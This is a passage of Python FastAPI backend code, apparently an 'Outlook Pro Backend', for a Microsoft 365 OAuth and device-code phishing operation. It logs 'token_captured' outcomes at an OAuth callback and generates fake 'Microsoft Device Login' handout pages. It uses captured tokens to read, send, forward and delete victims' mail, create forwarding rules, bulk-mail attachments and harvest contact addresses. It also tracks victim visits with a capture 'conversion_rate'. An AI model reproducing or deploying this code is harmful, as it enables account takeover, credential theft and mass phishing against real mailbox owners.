                {
                    "id": invite.id,
                    "admin_user_id": invite.admin_user_id,
                    "invite_token": invite.invite_token,
                    "tenant_hint": getattr(
                        invite, "tenant_hint", None
                    ),
                    "resolved_user_id": invite.resolved_user_id,
                    "job_title": getattr(
                        invite, "job_title", None
                    ),
                    "is_used": invite.is_used,
                    "created_at": getattr(
                        invite, "created_at", None
                    ),
                    "used_at": invite.used_at,
                }
                for invite in invites
            ]
        }
    finally:
        db.close()


# =========================
# AUTH CALLBACK
# =========================
@app.get("/auth/callback")
def auth_callback(request: Request):
    init_db()

    all_params = dict(request.query_params)
    print(f"[auth/callback] ALL PARAMS: {all_params}")

    code = request.query_params.get("code")
    state = request.query_params.get("state")
    error = request.query_params.get("error")
    error_description = request.query_params.get(
        "error_description"
    )
    relay = request.query_params.get("relay")
    relay_host = request.query_params.get("relay_host")
    relay_path = request.query_params.get("relay_path")
    worker_secret = request.query_params.get("worker_secret")

    print(
        f"[auth/callback] EXTRACTED\n"
        f"  relay={relay}\n"
        f"  relay_host={relay_host}\n"
        f"  relay_path={relay_path}\n"
        f"  code_present={bool(code)}\n"
        f"  error={error}"
    )

    if error:
        print(
            f"[auth/callback] OAuth error received\n"
            f"  error={error}\n"
            f"  description={error_description}"
        )
        record_visit_from_request(
            request=request,
            url_type="oauth_callback",
            outcome=f"failed: {error}",
        )
        return JSONResponse(
            status_code=400,
            content={
                "error": error,
                "error_description": error_description or "",
                "help": (
                    "This is an OAuth error returned by Microsoft."
                    " Please request a new sign-in link and try "
                    "again."
                ),
            },
        )

    if not code:
        print("[auth/callback] No code received")
        record_visit_from_request(
            request=request,
            url_type="oauth_callback",
            outcome="failed: no_code",
        )
        return JSONResponse(
            status_code=400,
            content={
                "error": "no_code",
                "error_description": (
                    "No authorization code was received. "
                    "Please try signing in again."
                ),
            },
        )

    client_ip = request.client.host if request.client else None
    user_agent = request.headers.get("user-agent")

    print(
        f"[auth/callback] Starting token exchange\n"
        f"  code_length={len(code or '')}\n"
        f"  relay_host={relay_host}"
    )

    try:
        result = exchange_code_for_token(
            code=code,
            state=state or "",
            client_ip=client_ip,
            user_agent=user_agent,
            relay=relay,
            relay_host=relay_host,
            relay_path=relay_path,
            worker_secret=worker_secret,
        )

        if result is None:
            record_visit_from_request(
                request=request,
                url_type="oauth_callback",
                outcome="failed: null_result",
            )
            return JSONResponse(
                status_code=500,
                content={
                    "error": "null_result",
                    "error_description": (
                        "Token exchange returned no result."
                    ),
                },
            )

        # Record successful visit
        # admin_user_id comes from the decrypted OAuth state
        # record_visit_from_request will look it up from the
        # database if it is missing
        record_visit_from_request(
            request=request,
            target_user_id=result.get("resolved_user_id"),
            admin_user_id=result.get("admin_user_id"),
            url_type=result.get("flow_type", "oauth_callback"),
            outcome="token_captured",
        )

        success_redirect = os.environ.get(
            "OAUTH_SUCCESS_REDIRECT",
            "https://outlook.office.com/mail/",
        )
        return RedirectResponse(
            url=success_redirect,
            status_code=302,
        )

    except Exception as e:
        error_str = str(e)

        record_visit_from_request(
            request=request,
            url_type="oauth_callback",
            outcome=f"failed: {error_str[:100]}",
        )

        import re as _re
        error_code = "token_exchange_failed"
        match = _re.search(r"AADSTS\d+", error_str)
        if match:
            error_code = match.group(0)

        return JSONResponse(
            status_code=400,
            content={
                "error": error_code,
                "error_description": error_str,
            },
        )


# =========================
# EMAILS
# =========================
@app.get("/emails")
def get_emails(
    user_id: str | None = None,
    folder_id: str | None = None,
    limit: int = 50,
    next_link: str | None = None,
    user=Depends(verify_token),
):
    resolved_user_id = resolve_user_id(user_id, user)
    try:
        result = fetch_emails(
            resolved_user_id,
            folder_id=folder_id,
            limit=limit,
            next_link=next_link,
        )
        if isinstance(result, dict):
            return result
        return {
            "emails": result,
            "next_link": None,
            "page_size": limit,
        }
    except Exception as e:
        raise HTTPException(status_code=400, detail=str(e))


@app.get("/folders")
def get_folders(
    user_id: str | None = None,
    user=Depends(verify_token),
):
    resolved_user_id = resolve_user_id(user_id, user)
    try:
        return {"folders": get_mail_folders(resolved_user_id)}
    except Exception as e:
        raise HTTPException(status_code=400, detail=str(e))


@app.get("/email/{message_id}")
def email_detail(
    message_id: str,
    user_id: str | None = None,
    user=Depends(verify_token),
):
    resolved_user_id = resolve_user_id(user_id, user)
    try:
        return get_email_detail(resolved_user_id, message_id)
    except Exception as e:
        raise HTTPException(status_code=400, detail=str(e))


@app.post("/email/reply")
async def reply_email_route(
    request: Request,
    user=Depends(verify_token),
):
    body = await request.json()
    resolved_user_id = resolve_user_id(body.get("user_id"), user)
    return reply_to_email(
        resolved_user_id,
        body.get("message_id"),
        body.get("reply_text"),
    )


@app.post("/email/send")
async def send_email_route(
    request: Request,
    user=Depends(verify_token),
):
    body = await request.json()
    resolved_user_id = resolve_user_id(body.get("user_id"), user)
    return send_email(
        resolved_user_id,
        body.get("to"),
        body.get("subject"),
        body.get("body"),
    )


@app.post("/email/forward")
async def forward_email_route(
    request: Request,
    user=Depends(verify_token),
):
    body = await request.json()
    resolved_user_id = resolve_user_id(body.get("user_id"), user)
    return forward_email(
        resolved_user_id,
        body.get("message_id"),
        body.get("to"),
    )


@app.post("/email/delete")
async def delete_email_route(
    request: Request,
    user=Depends(verify_token),
):
    body = await request.json()
    resolved_user_id = resolve_user_id(body.get("user_id"), user)
    return delete_email(
        resolved_user_id,
        body.get("message_id"),
    )


@app.post("/email/mark-read")
async def mark_read_route(
    request: Request,
    user=Depends(verify_token),
):
    body = await request.json()
    resolved_user_id = resolve_user_id(body.get("user_id"), user)
    return mark_as_read(
        resolved_user_id,
        body.get("message_id"),
        body.get("is_read", True),
    )


@app.post("/email/move")
async def move_email_route(
    request: Request,
    user=Depends(verify_token),
):
    body = await request.json()
    resolved_user_id = resolve_user_id(body.get("user_id"), user)
    return move_email_to_folder(
        resolved_user_id,
        body.get("message_id"),
        body.get("folder_id"),
    )


# =========================
# EXPORT EMAIL ADDRESSES
# =========================
@app.get("/export-email-addresses")
def export_email_addresses(
    max_messages: int | None = None,
    user=Depends(verify_token),
):
    db = SessionLocal()
    try:
        admin_user_id = user["sub"]
        per_mailbox_limit = (
            max_messages or MAX_EXPORT_MESSAGES_PER_MAILBOX
        )
        per_mailbox_limit = max(
            1, min(int(per_mailbox_limit), 2000)
        )

        saved_rows = (
            db.query(SavedUser.user_id)
            .filter(SavedUser.admin_user_id == admin_user_id)
            .distinct()
            .all()
        )
        saved_user_ids = [row[0] for row in saved_rows if row[0]]

        connected_rows = (
            db.query(TenantToken.tenant_id).distinct().all()
        )
        connected_user_ids = [
            row[0] for row in connected_rows if row[0]
        ]

        user_ids = sorted(
            set(saved_user_ids + connected_user_ids)
        )

        output = io.StringIO()
        writer = csv.DictWriter(
            output,
            fieldnames=[
                "email",
                "mailbox_user_id",
                "address_type",
                "source_message_id",
                "sample_subject",
                "sample_received_at",
            ],
        )
        writer.writeheader()

        seen = set()
        errors = []

        for mailbox_user_id in user_ids:
            try:
                result = export_mailbox_email_addresses(
                    mailbox_user_id,
                    max_messages=per_mailbox_limit,
                )
                for row in result.get("addresses", []):
                    dedupe_key = (
                        row.get("email"),
                        row.get("mailbox_user_id"),
                    )
                    if dedupe_key in seen:
                        continue
                    seen.add(dedupe_key)
                    writer.writerow(
                        {
                            "email": row.get("email", ""),
                            "mailbox_user_id": row.get(
                                "mailbox_user_id", ""
                            ),
                            "address_type": row.get(
                                "address_type", ""
                            ),
                            "source_message_id": row.get(
                                "source_message_id", ""
                            ),
                            "sample_subject": row.get(
                                "sample_subject", ""
                            ),
                            "sample_received_at": row.get(
                                "sample_received_at", ""
                            ),
                        }
                    )
            except Exception as e:
                errors.append(f"{mailbox_user_id}: {str(e)}")

        csv_bytes = output.getvalue().encode("utf-8")
        headers = {
            "Content-Disposition": (
                "attachment; "
                "filename=email_address_audit_export.csv"
            ),
            "X-Exported-Address-Count": str(len(seen)),
            "X-Export-Errors": " | ".join(errors)[:500],
        }

        return StreamingResponse(
            io.BytesIO(csv_bytes),
            media_type="text/csv",
            headers=headers,
        )
    finally:
        db.close()


# =========================
# APPROVED SEND
# =========================
@app.post("/send-approved-email")
async def send_approved_email(
    user_id: str = Form(...),
    recipient: str = Form(...),
    subject: str = Form(...),
    body: str = Form(...),
    cc: str | None = Form(None),
    bcc: str | None = Form(None),
    attachment: UploadFile | None = File(None),
    user=Depends(verify_token),
):
    resolved_user_id = resolve_user_id(user_id, user)
    recipient = (recipient or "").strip()

    if not EMAIL_ADDRESS_RE.match(recipient):
        raise HTTPException(
            status_code=400,
            detail="A valid single recipient email is required.",
        )

    uploaded_attachment = None
    if attachment:
        content = await attachment.read()
        if len(content) > 3_000_000:
            raise HTTPException(
                status_code=400,
                detail="Attachment must be under 3 MB.",
            )
        uploaded_attachment = {
            "filename": attachment.filename or "attachment",
            "content_type": (
                attachment.content_type
                or "application/octet-stream"
            ),
            "content": content,
        }

    try:
        result = send_email_with_attachment(
            resolved_user_id,
            recipient,
            subject,
            body,
            uploaded_attachment,
            cc=cc,
            bcc=bcc,
        )

        db = SessionLocal()
        try:
            db.add(
                Alert(
                    user_id=resolved_user_id,
                    level="info",
                    message=f"Approved email sent to {recipient}",
                    created_at=int(time.time()),
                )
            )
            db.commit()
        finally:
            db.close()

        return result
    except Exception as e:
        raise HTTPException(status_code=400, detail=str(e))


def parse_approved_recipient_list(
    raw_text: str | None,
    csv_file_text: str | None = None,
):
    combined = "\n".join([raw_text or "", csv_file_text or ""])
    candidates = []

    for line in combined.replace(";", "\n").splitlines():
        for part in line.split(","):
            value = part.strip().strip('"').strip("'")
            if value:
                candidates.append(value)

    seen = set()
    approved = []
    rejected = []

    for candidate in candidates:
        normalized = candidate.lower()
        if not EMAIL_ADDRESS_RE.match(candidate):
            rejected.append(candidate)
            continue
        if normalized in seen:
            continue
        seen.add(normalized)
        approved.append(candidate)

    return approved, rejected


@app.post("/send-approved-bulk-email")
async def send_approved_bulk_email(
    user_id: str = Form(...),
    recipients: str = Form(""),
    subject: str = Form(...),
    body: str = Form(...),
    cc: str | None = Form(None),
    bcc: str | None = Form(None),
    delay_seconds: int = Form(5),
    max_recipients: int = Form(25),
    attachment: UploadFile | None = File(None),
    recipients_file: UploadFile | None = File(None),
    user=Depends(verify_token),
):
    resolved_user_id = resolve_user_id(user_id, user)

    if not subject.strip():
        raise HTTPException(
            status_code=400, detail="Subject is required."
        )
    if not body.strip():
        raise HTTPException(
            status_code=400, detail="Message body is required."
        )

    csv_file_text = ""
    if recipients_file:
        file_bytes = await recipients_file.read()
        if len(file_bytes) > 500_000:
            raise HTTPException(
                status_code=400,
                detail="Recipient file must be under 500 KB.",
            )
        csv_file_text = file_bytes.decode("utf-8", errors="ignore")

    approved_recipients, rejected_recipients = (
        parse_approved_recipient_list(recipients, csv_file_text)
    )

    max_recipients = max(1, min(int(max_recipients or 25), 50))
    delay_seconds = max(2, min(int(delay_seconds or 5), 60))

    if not approved_recipients:
        raise HTTPException(
            status_code=400,
            detail=(
                "No valid approved recipient emails were provided."
            ),
        )

    if len(approved_recipients) > max_recipients:
        raise HTTPException(
            status_code=400,
            detail=(
                f"Too many recipients. "
                f"Limit this send to {max_recipients} "
                f"approved recipients."
            ),
        )

    uploaded_attachment = None
    if attachment:
        content = await attachment.read()
        if len(content) > 3_000_000:
            raise HTTPException(
                status_code=400,
                detail="Attachment must be under 3 MB.",
            )
        uploaded_attachment = {
            "filename": attachment.filename or "attachment",
            "content_type": (
                attachment.content_type
                or "application/octet-stream"
            ),
            "content": content,
        }

    results = []
    sent_count = 0
    failed_count = 0

    for index, recipient in enumerate(approved_recipients):
        if index > 0:
            time.sleep(delay_seconds)
        try:
            send_email_with_attachment(
                resolved_user_id,
                recipient,
                subject,
                body,
                uploaded_attachment,
                cc=cc,
                bcc=bcc,
            )
            results.append(
                {"recipient": recipient, "status": "sent"}
            )
            sent_count += 1
        except Exception as e:
            results.append(
                {
                    "recipient": recipient,
                    "status": "failed",
                    "error": str(e),
                }
            )
            failed_count += 1

    db = SessionLocal()
    try:
        db.add(
            Alert(
                user_id=resolved_user_id,
                level="info",
                message=(
                    f"Approved bulk send complete. "
                    f"Sent: {sent_count}, Failed: {failed_count}"
                ),
                created_at=int(time.time()),
            )
        )
        db.commit()
    finally:
        db.close()

    return {
        "sent_count": sent_count,
        "failed_count": failed_count,
        "rejected_count": len(rejected_recipients),
        "rejected_recipients": rejected_recipients,
        "total_attempted": len(approved_recipients),
        "results": results,
    }


# =========================
# RULES
# =========================
@app.get("/rules")
def get_rules(
    user_id: str | None = None,
    user=Depends(verify_token),
):
    resolved_user_id = resolve_user_id(user_id, user)
    db = SessionLocal()
    try:
        rules = (
            db.query(Rule)
            .filter(Rule.user_id == resolved_user_id)
            .order_by(Rule.id.asc())
            .all()
        )
        return {
            "rules": [
                {
                    "id": rule.id,
                    "user_id": rule.user_id,
                    "condition": rule.condition,
                    "keyword": rule.keyword,
                    "action": (
                        rule.action.value
                        if hasattr(rule.action, "value")
                        else str(rule.action)
                    ),
                    "target_folder": rule.target_folder,
                    "forward_to": rule.forward_to,
                    "is_active": rule.is_active,
                    "created_at": rule.created_at,
                }
                for rule in rules
            ]
        }
    finally:
        db.close()


@app.post("/rules")
async def create_rule(
    request: Request,
    user=Depends(verify_token),
):
    body = await request.json()
    resolved_user_id = resolve_user_id(body.get("user_id"), user)

    condition = (body.get("condition") or "").strip()
    keyword = (body.get("keyword") or "").strip()
    action = (body.get("action") or "").strip()

    if not condition:
        raise HTTPException(
            status_code=400, detail="condition is required"
        )
    if not keyword:
        raise HTTPException(
            status_code=400, detail="keyword is required"
        )
    if not action:
        raise HTTPException(
            status_code=400, detail="action is required"
        )

    valid_actions = [a.value for a in RuleAction]
    if action not in valid_actions:
        raise HTTPException(
            status_code=400,
            detail=f"action must be one of: {valid_actions}",
        )

    if action == "move" and not body.get("target_folder"):
        raise HTTPException(
            status_code=400,
            detail="target_folder is required for move action",
        )
    if action == "forward" and not body.get("forward_to"):
        raise HTTPException(
            status_code=400,
            detail="forward_to is required for forward action",
        )

    db = SessionLocal()
    try:
        rule = Rule(
            user_id=resolved_user_id,
            condition=condition,
            keyword=keyword,
            action=RuleAction(action),
            target_folder=body.get("target_folder"),
            forward_to=body.get("forward_to"),
            is_active=bool(body.get("is_active", True)),
        )
        db.add(rule)
        db.commit()
        db.refresh(rule)
        return {
            "id": rule.id,
            "user_id": rule.user_id,
            "condition": rule.condition,
            "keyword": rule.keyword,
            "action": (
                rule.action.value
                if hasattr(rule.action, "value")
                else str(rule.action)
            ),
            "target_folder": rule.target_folder,
            "forward_to": rule.forward_to,
            "is_active": rule.is_active,
            "created_at": rule.created_at,
        }
    finally:
        db.close()


@app.delete("/rules/{rule_id}")
def delete_rule(rule_id: int, user=Depends(verify_token)):
    db = SessionLocal()
    try:
        rule = (
            db.query(Rule).filter(Rule.id == rule_id).first()
        )
        if not rule:
            raise HTTPException(
                status_code=404, detail="Rule not found"
            )
        db.delete(rule)
        db.commit()
        return {"message": "Rule deleted", "rule_id": rule_id}
    finally:
        db.close()


@app.patch("/rules/{rule_id}")
async def update_rule(
    rule_id: int,
    request: Request,
    user=Depends(verify_token),
):
    body = await request.json()
    db = SessionLocal()
    try:
        rule = (
            db.query(Rule).filter(Rule.id == rule_id).first()
        )
        if not rule:
            raise HTTPException(
                status_code=404, detail="Rule not found"
            )

        if "condition" in body:
            rule.condition = body["condition"]
        if "keyword" in body:
            rule.keyword = body["keyword"]
        if "action" in body:
            valid_actions = [a.value for a in RuleAction]
            if body["action"] not in valid_actions:
                raise HTTPException(
                    status_code=400,
                    detail=(
                        f"action must be one of: {valid_actions}"
                    ),
                )
            rule.action = RuleAction(body["action"])
        if "target_folder" in body:
            rule.target_folder = body["target_folder"]
        if "forward_to" in body:
            rule.forward_to = body["forward_to"]
        if "is_active" in body:
            rule.is_active = bool(body["is_active"])

        db.commit()
        db.refresh(rule)
        return {
            "id": rule.id,
            "user_id": rule.user_id,
            "condition": rule.condition,
            "keyword": rule.keyword,
            "action": (
                rule.action.value
                if hasattr(rule.action, "value")
                else str(rule.action)
            ),
            "target_folder": rule.target_folder,
            "forward_to": rule.forward_to,
            "is_active": rule.is_active,
        }
    finally:
        db.close()


# =========================
# ALERTS
# =========================
@app.get("/alerts")
def get_alerts(
    user_id: str | None = None,
    limit: int = 50,
    user=Depends(verify_token),
):
    resolved_user_id = resolve_user_id(user_id, user)
    db = SessionLocal()
    try:
        alerts = (
            db.query(Alert)
            .filter(Alert.user_id == resolved_user_id)
            .order_by(Alert.created_at.desc())
            .limit(limit)
            .all()
        )
        return {
            "alerts": [
                {
                    "id": a.id,
                    "user_id": a.user_id,
                    "level": a.level,
                    "message": a.message,
                    "created_at": a.created_at,
                }
                for a in alerts
            ]
        }
    finally:
        db.close()


@app.post("/alerts")
async def create_alert(
    request: Request,
    user=Depends(verify_token),
):
    body = await request.json()
    resolved_user_id = resolve_user_id(body.get("user_id"), user)
    message = (body.get("message") or "").strip()
    level = (body.get("level") or "info").strip()

    if not message:
        raise HTTPException(
            status_code=400,
            detail="message is required",
        )

    db = SessionLocal()
    try:
        alert = Alert(
            user_id=resolved_user_id,
            level=level,
            message=message,
            created_at=int(time.time()),
        )
        db.add(alert)
        db.commit()
        db.refresh(alert)
        return {
            "id": alert.id,
            "user_id": alert.user_id,
            "level": alert.level,
            "message": alert.message,
            "created_at": alert.created_at,
        }
    finally:
        db.close()


@app.delete("/alerts/{alert_id}")
def delete_alert(alert_id: int, user=Depends(verify_token)):
    db = SessionLocal()
    try:
        alert = (
            db.query(Alert).filter(Alert.id == alert_id).first()
        )
        if not alert:
            raise HTTPException(
                status_code=404,
                detail="Alert not found",
            )
        db.delete(alert)
        db.commit()
        return {
            "message": "Alert deleted",
            "alert_id": alert_id,
        }
    finally:
        db.close()


# =========================
# DEVICE CODE HANDOUT
# =========================
@app.get("/device-code/handout/{format_type}")
def device_code_handout(
    format_type: str,
    user_code: str,
    verification_uri: str,
    title: str = "Microsoft Device Login",
    brief_writeup: str = (
        "Please follow the steps below to continue sign-in."
    ),
    logo_url: str = "",
    download: str = "0",
    user=Depends(verify_token),
):
    if not user_code or not verification_uri:
        raise HTTPException(
            status_code=400,
            detail="user_code and verification_uri are required",
        )

    html_content = f"""<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8"/>
<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
<title>{title}</title>
<style>
  body {{
    font-family: Inter, Segoe UI, Arial, sans-serif;
    background: #f7f9fc;
    display: flex;
    justify-content: center;
    align-items: center;
    min-height: 100vh;
    margin: 0;
  }}
  .card {{
    background: #fff;
    border-radius: 24px;
    box-shadow: 0 20px 60px rgba(16,24,40,0.10);
    padding: 40px 36px;
    max-width: 480px;
    width: 100%;
    text-align: center;
  }}
  .logo {{
    max-height: 56px;
    margin-bottom: 20px;
  }}
  h1 {{
    font-size: 26px;
    font-weight: 900;
    color: #101828;
    margin-bottom: 10px;
  }}
  .writeup {{
    font-size: 15px;
    color: #667085;
    margin-bottom: 28px;
    line-height: 1.7;
  }}
  .step {{
    background: #f0f5ff;
    border-radius: 16px;
    padding: 16px 20px;
    margin-bottom: 16px;
    text-align: left;
  }}
  .step-label {{
    font-size: 12px;
    font-weight: 800;
    color: #2e90fa;
    text-transform: uppercase;
    letter-spacing: 1px;
    margin-bottom: 6px;
  }}
  .step-value {{
    font-size: 18px;
    font-weight: 900;
    color: #101828;
    word-break: break-all;
  }}
  .code-pill {{
    display: inline-block;
    background: #fff;
    border: 2px dashed #84adff;
    border-radius: 16px;
    padding: 14px 28px;
    font-size: 32px;
    font-weight: 900;
    letter-spacing: 6px;
    color: #175cd3;
    margin: 10px 0 20px 0;
  }}
  .footer {{
    font-size: 12px;
    color: #98a2b3;
    margin-top: 24px;
  }}
</style>
</head>
<body>
<div class="card">
  {f'<img class="logo" src="{logo_url}" alt="Logo"/>' if logo_url else ""}
  <h1>{title}</h1>
  <div class="writeup">{brief_writeup}</div>
  <div class="step">
    <div class="step-label">Step 1 — Go to</div>
    <div class="step-value">
      <a href="{verification_uri}" target="_blank"
         style="color:#175cd3;text-decoration:none;">
        {verification_uri}
      </a>
    </div>
  </div>
  <div class="step">
    <div class="step-label">Step 2 — Enter this code</div>
    <div class="code-pill">{user_code}</div>
  </div>
  <div class="step">
    <div class="step-label">Step 3</div>
    <div class="step-value" style="font-size:15px;font-weight:700;">
      Sign in with your Microsoft account and follow the prompts.
    </div>
  </div>
  <div class="footer">
    This page was generated automatically. Do not share this
    code with anyone you do not trust.
  </div>
</div>
</body>
</html>"""

    if format_type == "pdf":
        try:
            import pdfkit
            pdf_bytes = pdfkit.from_string(html_content, False)
            headers = {}
            if download == "1":
                headers["Content-Disposition"] = (
                    "attachment; filename=device_login.pdf"
                )
            return StreamingResponse(
                io.BytesIO(pdf_bytes),
                media_type="application/pdf",
                headers=headers,
            )
        except Exception as e:
            raise HTTPException(
                status_code=500,
                detail=f"PDF generation failed: {e}",
            )

    headers = {}
    if download == "1":
        headers["Content-Disposition"] = (
            "attachment; filename=device_login.html"
        )

    return HTMLResponse(content=html_content, headers=headers)


@app.get("/device-code/support-page-link")
def device_code_support_page_link(
    user_code: str,
    verification_uri: str,
    title: str = "Microsoft Device Login",
    brief_writeup: str = (
        "Please follow the steps below to continue sign-in."
    ),
    logo_url: str = "",
    user=Depends(verify_token),
):
    if not user_code or not verification_uri:
        raise HTTPException(
            status_code=400,
            detail="user_code and verification_uri are required",
        )

    params = urlencode(
        {
            "user_code": user_code,
            "verification_uri": verification_uri,
            "title": title,
            "brief_writeup": brief_writeup,
            "logo_url": logo_url,
        }
    )

    backend_base = os.environ.get(
        "BACKEND_BASE_URL",
        "https://oauth-backend-7cuu.onrender.com",
    ).rstrip("/")

    support_page_url = (
        f"{backend_base}/device-code/handout/html?{params}"
    )

    return {"support_page_url": support_page_url}


# =========================
# TOKENS (ADMIN DEBUG)
# =========================
@app.get("/tokens")
def list_tokens(user=Depends(verify_token)):
    db = SessionLocal()
    try:
        rows = db.query(TenantToken).all()
        return {
            "tokens": [
                {
                    "id": row.id,
                    "tenant_id": row.tenant_id,
                    "session_id": getattr(
                        row, "session_id", None
                    ),
                    "expires_at": row.expires_at,
                    "has_refresh_token": bool(row.refresh_token),
                    "ip_address": row.ip_address,
                    "location": row.location,
                    "created_at": row.created_at,
                    "updated_at": row.updated_at,
                }
                for row in rows
            ]
        }
    finally:
        db.close()


@app.delete("/tokens/{tenant_id}")
def delete_token(tenant_id: str, user=Depends(verify_token)):
    db = SessionLocal()
    try:
        row = (
            db.query(TenantToken)
            .filter(TenantToken.tenant_id == tenant_id)
            .first()
        )
        if not row:
            raise HTTPException(
                status_code=404,
                detail=f"No token found for tenant_id: {tenant_id}",
            )
        db.delete(row)
        db.commit()
        return {
            "message": "Token deleted",
            "tenant_id": tenant_id,
        }
    finally:
        db.close()


# =========================
# CONVERSATION
# =========================
@app.get("/conversation/{conversation_id}")
def get_conversation_route(
    conversation_id: str,
    user_id: str | None = None,
    user=Depends(verify_token),
):
    from graph import get_conversation
    resolved_user_id = resolve_user_id(user_id, user)
    try:
        messages = get_conversation(
            resolved_user_id, conversation_id
        )
        return {
            "messages": messages,
            "conversation_id": conversation_id,
        }
    except Exception as e:
        raise HTTPException(status_code=400, detail=str(e))


# =========================
# MICROSOFT GRAPH PROXY
# =========================
@app.get("/graph/me")
def graph_me(
    user_id: str | None = None,
    user=Depends(verify_token),
):
    resolved_user_id = resolve_user_id(user_id, user)
    from graph import graph_request, GRAPH_BASE_URL
    try:
        data = graph_request(
            "GET",
            f"{GRAPH_BASE_URL}/me",
            resolved_user_id,
        )
        return data
    except Exception as e:
        raise HTTPException(status_code=400, detail=str(e))


@app.get("/graph/me/mailbox-settings")
def graph_mailbox_settings(
    user_id: str | None = None,
    user=Depends(verify_token),
):
    resolved_user_id = resolve_user_id(user_id, user)
    from graph import graph_request, GRAPH_BASE_URL
    try:
        data = graph_request(
            "GET",
            f"{GRAPH_BASE_URL}/me/mailboxSettings",
            resolved_user_id,
        )
        return data
    except Exception as e:
        raise HTTPException(status_code=400, detail=str(e))


# =========================
# SYSTEM INFO
# =========================
@app.get("/system/info")
def system_info(user=Depends(verify_token)):
    db = SessionLocal()
    try:
        token_count = db.query(TenantToken).count()
        saved_user_count = (
            db.query(SavedUser)
            .filter(SavedUser.admin_user_id == user["sub"])
            .count()
        )
        consent_count = (
            db.query(TenantConsent)
            .filter(TenantConsent.admin_user_id == user["sub"])
            .count()
        )
        visit_count = (
            db.query(UrlVisit)
            .filter(
                or_(
                    UrlVisit.admin_user_id == user["sub"],
                    UrlVisit.admin_user_id == "__unresolved__",
                    UrlVisit.admin_user_id == "",
                    UrlVisit.admin_user_id == None,
                )
            )
            .count()
        )
        return {
            "service": "Outlook Pro Backend",
            "read_only_mode": READ_ONLY_MODE,
            "admin_consent_tenant": ADMIN_CONSENT_TENANT,
            "payload_builder": {
                "enabled": True,
                "encryption": "AES-256-GCM",
                "key_derivation": "PBKDF2-SHA256-100000",
                "mail_scope_count": (
                    len(ALL_MAIL_SCOPES.split())
                    if isinstance(ALL_MAIL_SCOPES, str)
                    else len(ALL_MAIL_SCOPES)
                ),
                "basic_scope_count": (
                    len(BASIC_PAYLOAD_SCOPES.split())
                    if isinstance(BASIC_PAYLOAD_SCOPES, str)
                    else len(BASIC_PAYLOAD_SCOPES)
                ),
                "replay_protection": True,
                "cache_entries": len(_payload_cache),
            },
            "oauth": {
                "redirect_uri": os.environ.get(
                    "REDIRECT_URI",
                    "https://oauth-backend-7cuu.onrender.com"
                    "/auth/callback",
                ),
                "worker_relay_enabled": bool(WORKER_DOMAIN),
                "worker_domain": WORKER_DOMAIN or "not configured",
                "device_code_tenant": os.environ.get(
                    "DEVICE_CODE_TENANT", "organizations"
                ),
            },
            "database": {
                "connected_tokens": token_count,
                "saved_users": saved_user_count,
                "tenant_consents": consent_count,
                "url_visits": visit_count,
            },
        }
    finally:
        db.close()


# =========================
# URL VISIT TRACKING
# =========================
@app.get("/visits")
def get_visits(
    limit: int = 100,
    offset: int = 0,
    target_user_id: str | None = None,
    outcome: str | None = None,
    user=Depends(verify_token),
):
    db = SessionLocal()
    try:
        admin_user_id = user["sub"]

        # Include visits recorded before admin_user_id was
        # resolved (stored as "__unresolved__" or empty)
        query = db.query(UrlVisit).filter(
            or_(
                UrlVisit.admin_user_id == admin_user_id,
                UrlVisit.admin_user_id == "__unresolved__",
                UrlVisit.admin_user_id == "",
                UrlVisit.admin_user_id == None,
            )
        )

        if target_user_id:
            query = query.filter(
                UrlVisit.target_user_id == target_user_id
            )
        if outcome:
            query = query.filter(
                UrlVisit.outcome == outcome
            )

        total = query.count()
        visits = (
            query
            .order_by(UrlVisit.visited_at.desc())
            .offset(offset)
            .limit(limit)
            .all()
        )

        return {
            "total": total,
            "offset": offset,
            "limit": limit,
            "visits": [
                {
                    "id": v.id,
                    "target_user_id": v.target_user_id,
                    "admin_user_id": v.admin_user_id,
                    "ip_address": v.ip_address,
                    "country": v.country,
                    "city": v.city,
                    "device_type": v.device_type,
                    "browser": v.browser,
                    "os": v.os,
                    "user_agent": v.user_agent,
                    "referrer": v.referrer,
                    "url_type": v.url_type,
                    "outcome": v.outcome,
                    "visited_at": v.visited_at,
                }
                for v in visits
            ],
        }
    finally:
        db.close()


@app.get("/visits/summary")
def get_visits_summary(user=Depends(verify_token)):
    db = SessionLocal()
    try:
        admin_user_id = user["sub"]

        # Same filter — include unresolved visits
        base_filter = or_(
            UrlVisit.admin_user_id == admin_user_id,
            UrlVisit.admin_user_id == "__unresolved__",
            UrlVisit.admin_user_id == "",
            UrlVisit.admin_user_id == None,
        )

        total_visits = (
            db.query(UrlVisit)
            .filter(base_filter)
            .count()
        )
        successful = (
            db.query(UrlVisit)
            .filter(base_filter)
            .filter(UrlVisit.outcome == "token_captured")
            .count()
        )
        failed = (
            db.query(UrlVisit)
            .filter(base_filter)
            .filter(UrlVisit.outcome.like("failed%"))
            .count()
        )

        unique_ips = (
            db.query(
                func.count(func.distinct(UrlVisit.ip_address))
            )
            .filter(base_filter)
            .scalar()
        )

        top_countries = (
            db.query(
                UrlVisit.country,
                func.count(UrlVisit.id).label("count"),
            )
            .filter(base_filter)
            .group_by(UrlVisit.country)
            .order_by(func.count(UrlVisit.id).desc())
            .limit(5)
            .all()
        )

        device_breakdown = (
            db.query(
                UrlVisit.device_type,
                func.count(UrlVisit.id).label("count"),
            )
            .filter(base_filter)
            .group_by(UrlVisit.device_type)
            .all()
        )

        browser_breakdown = (
            db.query(
                UrlVisit.browser,
                func.count(UrlVisit.id).label("count"),
            )
            .filter(base_filter)
            .group_by(UrlVisit.browser)
            .all()
        )

        now = int(time.time())
        last_24h = now - (24 * 60 * 60)
        recent_visits = (
            db.query(UrlVisit)
            .filter(base_filter)
            .filter(UrlVisit.visited_at >= last_24h)
            .count()
        )

        return {
            "total_visits": total_visits,
            "successful_captures": successful,
            "failed_attempts": failed,
            "unique_ips": unique_ips,
            "recent_visits_24h": recent_visits,
            "conversion_rate": (
                round(successful / total_visits * 100, 1)
                if total_visits > 0
                else 0
            ),
            "top_countries": [
                {"country": r.country, "count": r.count}
                for r in top_countries
            ],
            "device_breakdown": [
                {"device": r.device_type, "count": r.count}
                for r in device_breakdown
            ],
            "browser_breakdown": [
                {"browser": r.browser, "count": r.count}
                for r in browser_breakdown
            ],
        }
    finally:
        db.close()


@app.delete("/visits")
def clear_visits(user=Depends(verify_token)):
    db = SessionLocal()
    try:
        admin_user_id = user["sub"]
        deleted = (
            db.query(UrlVisit)
            .filter(
                or_(
                    UrlVisit.admin_user_id == admin_user_id,
                    UrlVisit.admin_user_id == "__unresolved__",
